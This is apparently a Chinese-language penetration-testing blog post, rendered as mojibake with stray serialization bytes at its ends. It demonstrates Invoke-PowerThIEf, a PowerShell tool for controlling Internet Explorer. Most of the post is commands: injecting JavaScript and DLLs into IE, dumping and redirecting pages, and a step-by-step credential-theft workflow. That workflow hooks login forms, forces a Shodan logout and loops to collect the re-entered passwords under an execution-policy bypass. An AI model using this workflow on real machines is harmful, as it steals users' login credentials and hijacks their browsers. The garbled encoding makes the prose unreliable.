I"›B<h2 id="0x00-å‰è¨€">0x00 å‰è¨€</h2>
<hr />

<p>Invoke-PowerThIEfæ˜¯ä¸€ä¸ªå¼€æºçš„Powershellè„šæœ¬ï¼Œä¸ä»…èƒ½å¤Ÿç”¨æ¥å¯¹IEæµè§ˆå™¨çª—å£çš„å†…å®¹è¿›è¡Œæ“ä½œï¼Œè¿˜èƒ½é€šè¿‡Hookçš„æ–¹æ³•æ•è·IEæµè§ˆå™¨çš„å‡­æ®ã€‚</p>

<p>åœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/nettitude/Invoke-PowerThIEf</p>

<p>æœ¬æ–‡å°†è¦å¯¹Invoke-PowerThIEfçš„åŠŸèƒ½è¿›è¡Œæµ‹è¯•ï¼Œåˆ†äº«åœ¨Win7 sp1 x64ä¸‹çš„ä½¿ç”¨æ–¹æ³•ï¼Œç»“åˆè‡ªå·±çš„ç»éªŒï¼Œåˆ†æåˆ©ç”¨æ€è·¯ã€‚</p>

<h2 id="0x01-ç®€ä»‹">0x01 ç®€ä»‹</h2>
<hr />

<p>æœ¬æ–‡å°†è¦ä»‹ç»ä»¥ä¸‹å†…å®¹ï¼š</p>

<ul>
  <li>åŠŸèƒ½æµ‹è¯•</li>
  <li>Win7Sp1ä¸‹çš„ä½¿ç”¨æ–¹æ³•</li>
  <li>åˆ©ç”¨åˆ†æ</li>
</ul>

<h2 id="0x02-åŠŸèƒ½æµ‹è¯•">0x02 åŠŸèƒ½æµ‹è¯•</h2>
<hr />

<p>Invoke-PowerThIEféœ€è¦çš„ç¯å¢ƒé…ç½®å¦‚ä¸‹ï¼š</p>

<ul>
  <li>IE 11</li>
  <li>Win 7-10</li>
  <li>.Net 4.0+</li>
  <li>Powershell 4.0</li>
</ul>

<p>è€ƒè™‘åˆ°ä»¥ä¸‹åŸå› ï¼š</p>

<ul>
  <li>Window7æˆ–Windows Server 2008ï¼Œé»˜è®¤å®‰è£…PowerShell 2.0</li>
  <li>Windows8æˆ–Windows server 2012ï¼Œé»˜è®¤å®‰è£…PowerShell 3.0</li>
  <li>Windows 8.1æˆ–Windows server 2012 R2ï¼Œé»˜è®¤å®‰è£…PowerShell 4.0</li>
</ul>

<p>é¦–å…ˆé€‰æ‹©Windows server 2012 R2 x64ä½œä¸ºæµ‹è¯•ç¯å¢ƒï¼Œå¯ç›´æ¥è¿è¡Œ</p>

<p>å¸¸ç”¨åŠŸèƒ½å¦‚ä¸‹ï¼š</p>

<h4 id="1åˆ—å‡ºieæµè§ˆå™¨çš„æ‰€æœ‰é¡µé¢">(1)åˆ—å‡ºIEæµè§ˆå™¨çš„æ‰€æœ‰é¡µé¢</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action ListUrls
</code></pre></div></div>

<h4 id="2åœ¨ieè¿›ç¨‹ä¸­åŠ è½½dll">(2)åœ¨IEè¿›ç¨‹ä¸­åŠ è½½dll</h4>

<p>ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action ExecPayload -PathPayload calc_x64.dll
</code></pre></div></div>

<p>é»˜è®¤ä¼šåœ¨æ‰€æœ‰é¡µé¢ä¸­æ‰§è¡ŒåŠ è½½dllçš„æ“ä½œï¼Œå¹¶ä¸”ä¼šæ–°å»ºæ–°çš„é¡µé¢</p>

<p>ä¾‹å¦‚ï¼š</p>

<p>å¦‚æœå½“å‰IEè¿›ç¨‹æœ‰3ä¸ªé¡µé¢ï¼Œæ‰§è¡Œè¯¥æ“ä½œåä¼šæ‰§è¡Œ3æ¬¡åŠ è½½dllçš„æ“ä½œï¼Œå¹¶ä¸”ä¼šåœ¨IEæµè§ˆå™¨ä¸­æ–°å»º3ä¸ªé¡µé¢</p>

<p>ä¸ªäººè®¤ä¸ºè¯¥åŠŸèƒ½çš„æ•ˆæœæœ‰é™</p>

<h4 id="3å‘ieé¡µé¢ä¸­æ’å…¥javascriptä»£ç å¹¶æ‰§è¡Œ">(3)å‘IEé¡µé¢ä¸­æ’å…¥JavaScriptä»£ç å¹¶æ‰§è¡Œ</h4>

<p>é’ˆå¯¹æ‰€æœ‰é¡µé¢ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action InvokeJS -Script &lt;JavaScript to run&gt;
</code></pre></div></div>

<p>é’ˆå¯¹æŒ‡å®šé¡µé¢ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action InvokeJS -BrowserIndex &lt;BrowserIndex&gt; -Script &lt;JavaScript to run&gt;
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p><code class="language-plaintext highlighter-rouge">&lt;BrowserIndex&gt;</code>å¯é€šè¿‡ListUrlså‘½ä»¤è·å¾—</p>

<p>ç¤ºä¾‹å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action InvokeJS -Script 'alert(document.location.href);'

Invoke-PowerThIEf -action InvokeJS -BrowserIndex 132572 -Script "alert(`"1`");"
</code></pre></div></div>

<h4 id="4dumpé¡µé¢å†…å®¹">(4)Dumpé¡µé¢å†…å®¹</h4>

<p>é’ˆå¯¹æ‰€æœ‰é¡µé¢ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action DumpHTML
</code></pre></div></div>

<p>é’ˆå¯¹æŒ‡å®šé¡µé¢ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action DumpHTML -BrowserIndex &lt;BrowserIndex&gt;
</code></pre></div></div>

<p>é’ˆå¯¹æŒ‡å®šé¡µé¢çš„æŒ‡å®šå…ƒç´ ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action DumpHTML -BrowserIndex &lt;BrowserIndex&gt; -SelectorType tag -Selector &lt;type&gt;

Invoke-PowerThIEf -action DumpHTML -BrowserIndex &lt;BrowserIndex&gt; -SelectorType id -Selector &lt;id&gt;

Invoke-PowerThIEf -action DumpHTML -BrowserIndex &lt;BrowserIndex&gt; -SelectorType name -Selector &lt;name&gt;
</code></pre></div></div>

<h4 id="5éšè—å’Œæ˜¾ç¤ºé¡µé¢">(5)éšè—å’Œæ˜¾ç¤ºé¡µé¢</h4>

<p>éšè—æ‰€æœ‰é¡µé¢ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action HideWindow
</code></pre></div></div>

<p>éšè—æŒ‡å®šé¡µé¢ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action HideWindow -BrowserIndex &lt;BrowserIndex&gt;
</code></pre></div></div>

<p>æ˜¾ç¤ºæ‰€æœ‰é¡µé¢ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action ShowWindow
</code></pre></div></div>

<p>æ˜¾ç¤ºæŒ‡å®šé¡µé¢ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action ShowWindow -BrowserIndex &lt;BrowserIndex&gt;
</code></pre></div></div>

<p>è¿™é‡Œä¼šå¯¹é¡µé¢æ‰€åœ¨çš„è¿›ç¨‹iexploer.exeè¿›è¡Œéšè—å’Œæ˜¾ç¤º</p>

<p>ä¾‹å¦‚ï¼š</p>

<p>å¦‚æœè¿›ç¨‹iexploer1.exeä¸‹æœ‰ä¸¤ä¸ªé¡µé¢Aå’ŒBï¼Œè¿›ç¨‹iexploer2.exeä¸‹æœ‰ä¸¤ä¸ªé¡µé¢Cå’ŒDï¼Œå¦‚æœéšè—é¡µé¢Aï¼Œé‚£ä¹ˆä¼šéšè—è¿›ç¨‹iexploer1.exeä¸‹çš„æ‰€æœ‰é¡µé¢Aå’ŒBï¼Œè€Œiexploer2.exeä¸‹æœ‰çš„ä¸¤ä¸ªé¡µé¢Cå’ŒDä¸å—å½±å“</p>

<h4 id="6é¡µé¢é‡å®šå‘">(6)é¡µé¢é‡å®šå‘</h4>

<p>æ§åˆ¶é¡µé¢è®¿é—®æŒ‡å®šçš„URL</p>

<p>é’ˆå¯¹æ‰€æœ‰é¡µé¢ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action Navigate -NavigateUrl &lt;URL&gt;
</code></pre></div></div>

<p>é’ˆå¯¹æŒ‡å®šé¡µé¢ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action Navigate -BrowserIndex &lt;BrowserIndex&gt; -NavigateUrl &lt;URL&gt;
</code></pre></div></div>

<h4 id="7æ•è·å‡­æ®">(7)æ•è·å‡­æ®</h4>

<p>è¿™é‡Œåˆ†ä¸ºä¸¤ä¸ªæ­¥éª¤ï¼š</p>

<p>1.å‘½ä»¤æ‰§è¡Œåï¼Œå°†ä¼šHookæ‰€æœ‰æ–°æ‰“å¼€çš„é¡µé¢å¹¶è®°å½•å‡­æ®</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action HookLoginForms 
</code></pre></div></div>

<p>2.æŸ¥çœ‹å·²æ•è·çš„å‡­æ®</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action Creds
</code></pre></div></div>

<h4 id="8æ–°å»ºé¡µé¢">(8)æ–°å»ºé¡µé¢</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action NewBackgroundTab
</code></pre></div></div>

<h2 id="0x03-win7sp1ä¸‹çš„ä½¿ç”¨æ–¹æ³•">0x03 Win7Sp1ä¸‹çš„ä½¿ç”¨æ–¹æ³•</h2>
<hr />

<p>è¿™é‡Œä½¿ç”¨çš„æµ‹è¯•ç³»ç»Ÿä¸ºWin7Sp1 x64</p>

<p>Invoke-PowerThIEfç›´æ¥åœ¨Win7sp1ä¸‹ä½¿ç”¨ä¼šæŠ¥é”™ï¼Œæç¤ºå¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Unable to find type [System.__ComObject]: make sure that the assembly containin
g this type is loaded.
At C:\test\Invoke-PowerThIEf.ps1:151 char:41
+         [OutputType([System.__ComObject] &lt;&lt;&lt;&lt; )]
    + CategoryInfo          : InvalidOperation: (System.__ComObject:String) []
   , ParentContainsErrorRecordException
    + FullyQualifiedErrorId : TypeNotFound
</code></pre></div></div>

<p>è¿™é‡Œéœ€è¦å®‰è£…Microsoft .NET Framework 4.5å’ŒWindows Management Framework 4.0</p>

<h3 id="1å®‰è£…microsoft-net-framework-45">1.å®‰è£…Microsoft .NET Framework 4.5</h3>

<p>å‘½ä»¤è¡Œä¸‹çš„å®‰è£…æ–¹æ³•å¯å‚è€ƒä¹‹å‰çš„æ–‡ç« <a href="https://3gstudent.github.io/æ¸—é€åŸºç¡€â€”â€”å‘½ä»¤è¡Œä¸‹å®‰è£…Microsoft_.NET_Framework">ã€Šæ¸—é€åŸºç¡€â€”â€”å‘½ä»¤è¡Œä¸‹å®‰è£…Microsoft .NET Frameworkã€‹</a></p>

<p>å®ç°è‡ªåŠ¨å®‰è£…çš„ä»£ç å¯å‚è€ƒï¼š</p>

<p>https://github.com/3gstudent/Homework-of-C-Language/blob/master/Install_.Net_Framework_from_the_command_line.cpp</p>

<p>å®‰è£…åéœ€è¦ç­‰å¾…ç³»ç»Ÿé‡æ–°å¯åŠ¨æ‰èƒ½ç”Ÿæ•ˆ</p>

<h3 id="2å®‰è£…windows-management-framework-40">2.å®‰è£…Windows Management Framework 4.0</h3>

<p>ä¸‹è½½åœ°å€ï¼š</p>

<p>https://www.microsoft.com/en-us/download/details.aspx?id=40855</p>

<p>å‘½ä»¤è¡Œä¸‹çš„å®‰è£…å‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wusa.exe Windows6.1-KB2819745-x64-MultiPkg.msu /quiet /norestart
</code></pre></div></div>

<p>å®‰è£…æˆåŠŸåè¿›ç¨‹wusa.exeå°†ä¼šè‡ªåŠ¨é€€å‡º</p>

<p>åŒæ ·éœ€è¦ç­‰å¾…ç³»ç»Ÿé‡å¯å¯åŠ¨æ‰èƒ½ç”Ÿæ•ˆ</p>

<p>å†æ¬¡æ‰§è¡ŒInvoke-PowerThIEf</p>

<p>æŠ¥é”™æç¤ºå¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Add-Type : Could not load file or assembly 'Microsoft.mshtml,
Version=7.0.3300.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a' or one
of its dependencies. The system cannot find the file specified.
At C:\test\Invoke-PowerThIEf.ps1:362 char:13
+             Add-Type -TypeDefinition $source -Language CSharp
-ReferencedAssembl ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~
    + CategoryInfo          : NotSpecified: (:) [Add-Type], FileNotFoundExcept
   ion
    + FullyQualifiedErrorId : System.IO.FileNotFoundException,Microsoft.PowerS
   hell.Commands.AddTypeCommand
</code></pre></div></div>

<p>é”™è¯¯çš„åŸå› æ˜¯ä»£ç ä¸­ä½¿ç”¨äº†ï¼š<code class="language-plaintext highlighter-rouge">using mshtml;</code> ï¼Œç¼ºå°‘è¿™ä¸ªå¼•ç”¨æ–‡ä»¶</p>

<p>Invoke-PowerThIEfåœ¨Server2012R2ä¸‹èƒ½å¤Ÿæ­£å¸¸ä½¿ç”¨ï¼Œäºæ˜¯æˆ‘å°è¯•æ¯”è¾ƒServer2012R2å’ŒWin7ç³»ç»Ÿçš„å·®å¼‚ï¼Œçœ‹çœ‹èƒ½å¦é€šè¿‡æ›¿æ¢æ–‡ä»¶çš„æ–¹å¼è§£å†³è¿™ä¸ªé—®é¢˜</p>

<h3 id="è§£å†³æ–¹æ³•1">è§£å†³æ–¹æ³•1</h3>

<p>å‚è€ƒèµ„æ–™ï¼š</p>

<p>https://www.crifan.com/microsoft_html_object_library_mshtml_tlb_in_com_vs_microsoft_mshtml_microsoft_mshtml_dll_in_dotnet/</p>

<p>åœ¨å®‰è£…VS2015çš„Server2012R2ä¸‹å°è¯•å¯¼å‡ºmshtml.dllï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Program Files (x86)\Microsoft SDKs\Windows\v7.0A\Bin\x64\tlbimp.exe C:\Windows\System32\mshtml.tlb /out:c:\test\mshtml.dll
</code></pre></div></div>

<p>è·å¾—mshtml.dll</p>

<p>å°†mshtml.dllæ”¾åœ¨Invoke-PowerThIEfçš„åŒçº§ç›®å½•ä¸‹ï¼Œé‡å‘½åä¸ºMicrosoft.mshtml.dll</p>

<p>æ‰§è¡Œåä¾æ—§æ˜¯åŒæ ·çš„é”™è¯¯ï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-11/2-1.png" alt="Alt text" /></p>

<p>è¯¥æ–¹æ³•å¤±è´¥</p>

<h3 id="è§£å†³æ–¹æ³•2">è§£å†³æ–¹æ³•2</h3>

<p>ç»è¿‡å¯¹æ¯”ï¼Œå‘ç°Server2012R2æ¯”Win7ç³»ç»Ÿå¤šäº†æ–‡ä»¶å¤¹ï¼š<code class="language-plaintext highlighter-rouge">C:\Windows\assembly\GAC\Microsoft.mshtml</code></p>

<p>å¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-11/2-2.png" alt="Alt text" /></p>

<p>å…·ä½“å¤šå‡ºä»¥ä¸‹æ–‡ä»¶ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\assembly\GAC&gt;tree Microsoft.mshtml /f
Folder PATH listing
Volume serial number is F4B2-E12B
C:\WINDOWS\ASSEMBLY\GAC\MICROSOFT.MSHTML
â””â”€â”€â”€7.0.3300.0__b03f5f7f11d50a3a
        Microsoft.mshtml.dll
        __AssemblyInfo__.ini
</code></pre></div></div>

<p><strong>æ³¨ï¼š</strong></p>

<p>C:\Windows\assemblyä¸‹æ–‡ä»¶å¤¹çš„å…·ä½“å†…å®¹åªèƒ½é€šè¿‡å‘½ä»¤è¡Œè¿›è¡ŒæŸ¥çœ‹ï¼Œæ— æ³•åœ¨Explorerä¸­æŸ¥çœ‹</p>

<p>äºæ˜¯å°è¯•å°†Server2012R2ç³»ç»Ÿä¸­C:\Windows\assembly\GAC\Microsoft.mshtmlçš„æ‰€æœ‰å†…å®¹å¤åˆ¶åˆ°Win7ä¸‹é¢</p>

<p>æˆ‘å·²ç»å°†C:\Windows\assembly\GAC\Microsoft.mshtmlçš„æ‰€æœ‰å†…å®¹æå–å‡ºæ¥å¹¶ä¸Šä¼ è‡³githubï¼Œåœ°å€å¦‚ä¸‹ï¼š</p>

<p>https://github.com/3gstudent/Invoke-PowerThIEf/tree/master/Microsoft.mshtml</p>

<p>åœ¨Win7ç³»ç»Ÿçš„å‘½ä»¤è¡Œä¸‹æ‰§è¡Œï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>xcopy Microsoft.mshtml C:\Windows\assembly\GAC\Microsoft.mshtml /i /s /e
</code></pre></div></div>

<p>å†æ¬¡æ‰§è¡ŒInvoke-PowerThIEfï¼Œè¿è¡ŒæˆåŠŸï¼Œå¦‚ä¸‹å›¾</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-11-11/2-3.png" alt="Alt text" /></p>

<h2 id="0x04-åˆ©ç”¨åˆ†æ">0x04 åˆ©ç”¨åˆ†æ</h2>
<hr />

<p>Invoke-PowerThIEfçš„åˆ©ç”¨åœºæ™¯ä¸»è¦æœ‰ä»¥ä¸‹3ä¸ªï¼š</p>

<h3 id="1æ§åˆ¶ieæµè§ˆå™¨è®¿é—®æŒ‡å®šé¡µé¢å¹¶è·å¾—ç½‘é¡µå†…å®¹">1.æ§åˆ¶IEæµè§ˆå™¨è®¿é—®æŒ‡å®šé¡µé¢å¹¶è·å¾—ç½‘é¡µå†…å®¹</h3>

<h4 id="1åˆ›å»ºä¸€ä¸ªæ–°é¡µé¢">(1)åˆ›å»ºä¸€ä¸ªæ–°é¡µé¢</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action NewBackgroundTab
</code></pre></div></div>

<h4 id="2è·å¾—æ–°é¡µé¢çš„åºå·">(2)è·å¾—æ–°é¡µé¢çš„åºå·</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action ListUrls
</code></pre></div></div>

<p>å‡è®¾è¿™é‡Œçš„åºå·ä¸º132572</p>

<h4 id="3å°†å…¶é‡å®šå‘åˆ°æŒ‡å®šurl">(3)å°†å…¶é‡å®šå‘åˆ°æŒ‡å®šURL</h4>

<p>è¿™é‡Œä»¥<code class="language-plaintext highlighter-rouge">https://www.shodan.io/</code>ä¸ºä¾‹</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action Navigate -BrowserIndex 132572 -NavigateUrl https://www.shodan.io/
</code></pre></div></div>

<h4 id="4æŠ“å–é¡µé¢ç»“æœ">(4)æŠ“å–é¡µé¢ç»“æœ</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action DumpHTML -BrowserIndex 132572
</code></pre></div></div>

<h4 id="5å…³é—­æ­¤é¡µé¢">(5)å…³é—­æ­¤é¡µé¢</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action InvokeJS -BrowserIndex 132572 -Script "window.opener=null;window.open('','_self');window.close();"
</code></pre></div></div>

<h4 id="è¡¥å……é‡å®šå‘åˆ°ç©ºç™½é¡µé¢">è¡¥å……ï¼šé‡å®šå‘åˆ°ç©ºç™½é¡µé¢</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action Navigate -BrowserIndex 132572 -NavigateUrl about:blank
</code></pre></div></div>

<h3 id="2æŠ“å–å‡­æ®">2.æŠ“å–å‡­æ®</h3>

<h4 id="1åˆ—å‡ºæ‰€æœ‰æ ‡ç­¾">(1)åˆ—å‡ºæ‰€æœ‰æ ‡ç­¾</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action ListUrls
</code></pre></div></div>

<p>å‘ç°åå°æœ‰shodançš„ç™»å½•é¡µé¢</p>

<h4 id="2å¼€å¯æŠ“å–å‡­æ®çš„åŠŸèƒ½">(2)å¼€å¯æŠ“å–å‡­æ®çš„åŠŸèƒ½</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action HookLoginForms
</code></pre></div></div>

<h4 id="3å¼ºåˆ¶shodanè´¦å·é€€å‡ºç™»å½•çŠ¶æ€">(3)å¼ºåˆ¶shodanè´¦å·é€€å‡ºç™»å½•çŠ¶æ€</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action InvokeJS -BrowserIndex 525660 -Script "window.location.href = 'https://account.shodan.io/logout';"
</code></pre></div></div>

<p>ç­‰å¾…ç”¨æˆ·é‡æ–°ç™»å½•</p>

<h4 id="4æŸ¥çœ‹æŠ“å–åˆ°çš„å‡­æ®">(4)æŸ¥çœ‹æŠ“å–åˆ°çš„å‡­æ®</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action Creds 
</code></pre></div></div>

<p>è¿™é‡Œéœ€è¦æ³¨æ„ï¼Œæ‰§è¡Œå®Œæ­¥éª¤2åä¸èƒ½é€€å‡ºPowershellè¿›ç¨‹ï¼Œå¦åˆ™æ— æ³•æŠ“å–åˆ°æ–°çš„å‡­æ®</p>

<p>å¦‚æœæƒ³è¦è‡ªåŠ¨å®ç°ä»¥ä¸ŠåŠŸèƒ½ï¼Œè¿™é‡Œå¯ä»¥é€šè¿‡åŠ å¾ªç¯çš„æ–¹æ³•å®ç°æ¯éš”10ç§’åœ¨åå°æŠ“å–å‡­æ®ï¼Œä½¿ç”¨çš„Powershellå‘½ä»¤å¦‚ä¸‹ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action HookLoginForms
while(1)
{
    Start-Sleep â€“s 10
    Write-host "[*] Sleep 10 seconds"
    Invoke-PowerThIEf -action Creds
}
</code></pre></div></div>

<p>æ‰§è¡Œè„šæœ¬ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -ep bypass -f Invoke-PowerThIEf.ps1
</code></pre></div></div>

<h3 id="3ä¿®æ”¹é¡µé¢å†…å®¹æ‰§è¡Œjavascriptä»£ç ">3.ä¿®æ”¹é¡µé¢å†…å®¹ï¼Œæ‰§è¡ŒJavaScriptä»£ç </h3>

<p>é’ˆå¯¹æ‰€æœ‰é¡µé¢ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action InvokeJS -Script &lt;JavaScript to run&gt;
</code></pre></div></div>

<p>é’ˆå¯¹æŒ‡å®šé¡µé¢ï¼š</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-PowerThIEf -action InvokeJS -BrowserIndex &lt;BrowserIndex&gt; -Script &lt;JavaScript to run&gt;
</code></pre></div></div>

<p>è¦å®ç°çš„åŠŸèƒ½å–å†³äºå…·ä½“çš„JavaScriptä»£ç </p>

<h2 id="0x05-å°ç»“">0x05 å°ç»“</h2>
<hr />

<p>æœ¬æ–‡ä»‹ç»äº†Invoke-PowerThIEfæ”¯æŒçš„åŠŸèƒ½ï¼Œåˆ†äº«åœ¨Win7 sp1 x64ä¸‹çš„ä½¿ç”¨æ–¹æ³•ï¼Œç»“åˆè‡ªå·±çš„ç»éªŒï¼Œåˆ†æåˆ©ç”¨æ€è·¯ã€‚</p>

<hr />

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

:ET